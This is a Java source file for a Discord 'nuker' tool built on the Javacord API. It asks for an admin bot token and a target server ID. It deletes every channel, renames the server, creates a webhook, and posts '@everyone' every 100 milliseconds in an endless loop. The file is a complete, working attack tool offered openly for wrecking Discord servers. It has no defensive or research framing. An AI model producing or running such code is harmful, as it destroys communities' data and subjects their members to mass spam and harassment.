//
//Programmed by soviet, Discord: soviet#9475 
//

package bot.ok;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.Scanner;
import java.util.concurrent.ExecutionException;
import org.javacord.api.DiscordApi;
import org.javacord.api.DiscordApiBuilder;
import org.javacord.api.entity.channel.ServerChannel;
import org.javacord.api.entity.server.Server;

public class Main {

    public static Scanner sc = new Scanner(System.in);

    public static void main(String[] args) throws InterruptedException, ExecutionException, MalformedURLException {

    	//Prompts the user for a discord bot token then logs in via the javacord api
        System.out.println("Enter the token of a bot with admin perms in a server you want to nuke");
        String token = sc.nextLine();
        DiscordApi api = new DiscordApiBuilder().setToken(token).login().join();

        //Prompts the user for the id of the server to nuke
        System.out.println("Enter the id of the server you want to nuke");
        String c = sc.nextLine();

        //Prompts the user for the name that the server will be set to
        System.out.println("Enter the new name of the server");
        String name = sc.nextLine();

        //Prompts the user for the name of the channel that will be created
        System.out.println("Enter the name of the new channel");
        String cname = sc.nextLine();

        //Prompts the user for the name of the webhook that will be created
        System.out.println("Enter the name of the webhook to be created");
        String webName = sc.nextLine();

        //Declares a server object and deletes all the channels
        Server ser = api.getServerById(Long.parseLong(c)).get();
        ser.getChannels().forEach((ServerChannel sercha) -> {
            sercha.delete();
        });
        
        //Creates a webhook 
        URL pfp = new URL("https://cdn.discordapp.com/attachments/928122574058172456/935395498519564319/LordPepe.jpeg");
        String web = ser.createTextChannelBuilder().setName(cname).create().get().createWebhookBuilder().setName(webName).setAvatar(pfp).create().get().getUrl().toString();
        
        //Changes the server name
        ser.updateName(name);

        //Sends @everyone every 100ms 
        while (true) {
            try {
                send(web, "@everyone");
                Thread.sleep(100);
            } catch (Exception e) {
                System.out.println("Nuked LOL all hail pepe");
                break;
            }
        }
    }

    //Just some code for sending to a webhook (this is not my original code i just modified it a bit)
    private static void send(String w, String m) throws IOException {
        PrintWriter out = null;
        BufferedReader in = null;
        try {
            URL realUrl = new URL(w);

            URLConnection conn = realUrl.openConnection();
            conn.setRequestProperty("accept", "*/*");
            conn.setRequestProperty("connection", "Keep-Alive");
            conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            out = new PrintWriter(conn.getOutputStream());
            String postData = URLEncoder.encode("content", "UTF-8") + "=" + URLEncoder.encode(m, "UTF-8");
            out.print(postData);
            out.flush(); in = new BufferedReader(new InputStreamReader(conn.getInputStream()));

        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                if (out != null) {
                    out.close();
                }
                if ( in != null) { in .close();
                }
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }
}